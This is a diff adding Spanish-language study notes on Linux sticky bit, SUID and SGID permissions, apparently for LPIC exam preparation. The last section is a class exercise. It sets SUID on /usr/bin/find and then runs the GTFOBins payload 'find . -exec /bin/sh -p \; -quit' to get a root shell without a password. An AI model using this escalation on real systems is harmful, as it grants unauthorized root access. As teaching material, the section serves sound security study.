@@ -1,0 +1,90 @@
+Permisos especiales en Linux: Sticky Bit, SUID y SGID
+POR DAVIDOCHOBITS · 17 JUNIO, 2019
+
+
+ 
+Existen una serie de permisos especiales en GNU/Linux, que, aunque no son habituales, es necesarios saberlos, 
+por ejemplo, para trabajar en grupo sobre ciertos directorios o bien si deseamos sacarnos en algún momento los certificados de LPIC
+
+Respecto a los exámenes de LPIC, justo estoy en ello, por eso los últimos artículos en la web son tan técnicos, 
+ya que se tratan de áreas que salen en dichos exámenes y me sirven para refrescar conocimientos.
+
+@@@@Permisos especiales en Linux
+    #sticky bit
+    Se trata de un permiso de acceso que puede ser asignado a ficheros y directorios en sistemas UNIX y similares. 
+    Aunque históricamente su fin eran otro, actualmente el sticky bit se utiliza sobre directorios.
+
+    Cuando se le asigna a un directorio, significa que los elementos que hay en ese directorio solo pueden ser renombrados o 
+    borrados por su propietario o bien por root. El resto de usuarios que tengan permisos de lectura y escritura, 
+    los podrán leer y modificar, pero no borrar.
+
+    El sticky bit comúnmente es utilizado para “/tmp”
+
+    Este tipo de permisos sobre un directorio se puede otorgar de varias maneras:
+
+    1
+        chmod 1775 test
+        O bien
+
+
+    2
+        chmod +t /test #para activar sticky bit
+        chmod -t /test #para desactivar sticky bit
+        Si un usuario intenta borrar un fichero de una carpeta con sticky bit, recibierá el siguiente mensaje:
+
+
+
+            [david@servcentos]$ rm -rf hola
+            rm: cannot remove ‘hola’: Operation not permitted
+
+ 
+    #SUID
+        Cuando se activa el bit SUID sobre un fichero significa que el que lo ejecute va a tener los mismos permisos que 
+        el que creó el archivo. Esto es útil en algunas ocasiones, aunque hay que utilizarlo con cuidado, ya que puede acarrear 
+        problemas de seguridad
+
+        Para activarlo:
+
+
+            [david@servcentos test]$ chmod 4775 hello.sh
+            [david@servcentos test]$ ls -l hello.sh
+            -rwsrwxr-x 1 david david 26 Jun 11 19:02 hello.sh
+            [david@servcentos test]$ chmod -x hello.sh
+            [david@servcentos]$ ls -l hello.sh
+            -rwSrw-r-- 1 david david 26 Jun 12 19:02 hello.sh
+        
+        Observamos que en la última línea le quitamos el servicio de ejecución al archivo y en los permisos se reemplaza la s 
+        minúscula por la S mayúsculas.
+
+    #SGID
+        El bit SGID es lo mismo que SUID, pero a nivel de grupo. Esto es, todo archivo que tenga activo el SGID, al ser ejecutado, 
+        tendrás los privilegios del grupo al que pertenece.
+
+        Opción bastante útil si queremos configurar un directorio para colaborar diferentes usuarios. Si se aplica este bit al directorio, 
+        cualquier archivo creado en dicho directorio, tendrá asignado el grupo al que pertenece el directorio
+
+        Por ejemplo, si un usuario que tiene permiso de escritura en el directorio crea un archivo allí, ese archivo es un miembro del 
+        mismo grupo que el directorio y no el grupo del usuario. Como hemos dicho, esto es muy útil en la creación de directorios compartidos.
+
+
+            chmod g+s "directorio"
+            En el caso de un fichero:
+
+            1
+            chmod 2555 "fichero"
+
+-------------- CONTINUACION CLASE -----------------
+
+    1= Entramos como root y asignamos un permiso SUID al comando find.
+        # Para ver la ruta del comando find escribimos lo siguiente:
+            which find
+        # Y para ver los permisos de find escribimos:
+            which find | xargs ls -la
+        # Para asignar un SUID debemos incluir un 4 a la izquierda de los permisos, en este caso find tiene unos permisos de 755 por que en total seria 4755.
+            chmod 4755 /usr/bin/find
+        # Ahora en los permisos de propietario nos debe salir una "s" en ved "x"
+    2= Entramos con el usuario pepito:
+        # Entramos en la pagina https://gtfobins.github.io/ con informacion de explotacion de privilegios.
+        # Una ved hemos buscado en la web, la vulnerabilidad SUID de find copiamos y pegamos en consola:
+            find . -exec /bin/sh -p \; -quit
+        # Ahora somos root sin proporcionar la contraseña.
